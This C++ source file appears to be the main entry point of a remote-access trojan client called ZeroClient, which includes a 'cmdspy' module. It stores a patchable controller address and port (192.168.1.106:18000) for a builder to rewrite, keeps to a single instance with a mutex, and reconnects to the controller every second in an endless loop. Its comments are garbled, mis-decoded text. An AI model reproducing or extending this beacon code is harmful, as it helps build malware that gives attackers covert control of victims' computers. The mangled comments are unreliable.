#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include "zeroclient.h"
#include "cmdspy.h"

// 鍦ㄦ湇鍔＄鍒涘缓瀹㈡埛绔椂锛屽彲浠ヨ嚜瀹氫箟瀹㈡埛绔繛鍚戠殑鍩熷悕鍜岀鍙
const int gOffsetDomain = 10;
const char gDomain[100] = "DNSDNSDNS:192.168.1.106 ";
const int gOffsetPort = 13;
const char gPort[100] = "PORTPORTPORT:18000 ";

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
    // 妾㈡煡绐楀彛鏄惁鏈夐噸瑜
    char szFile[MAX_PATH],*szPt;

    GetModuleFileNameA(NULL,szFile,MAX_PATH);
    szPt = szFile + strlen(szFile);
    while(*--szPt != '\\') ;

    CreateMutexA(NULL,FALSE,szPt + 1);
    if(GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cout << "Same program already running" << std::endl;
        return -1;
    }

    // 鍒濆鍖朩indows socket鍔熻兘锛岃鍦╓indows浣跨敤缃戠粶蹇呴』鍒濆鍖栬繖涓
    WSAData wsaData;
    if (WSAStartup(MAKEWORD(2,1), &wsaData)) {
        std::cout << "Failed to initialize WSA" << std::endl;
        return -1;
    }

    // 涓诲惊鐜
    ZeroClient client;
    client.hInst = hInstance;
    while (1) {
        // 濡傛灉鏂紑浜嗭紝闅斾竴绉掕嚜鍔ㄨ繛鎺
        char domain[100] = {0};
        char *domainStartPos = (char*)gDomain+gOffsetDomain;
        char *domainStopPos = strchr(domainStartPos, ' ');
        memcpy(domain, domainStartPos, domainStopPos-domainStartPos);
        client.connectTo(domain, atoi(gPort+gOffsetPort));
        Sleep(1000);
    }

    // 绋嬪簭瀹岀粨鍚庨噴鏀網SA
    WSACleanup();

    return 0;
}
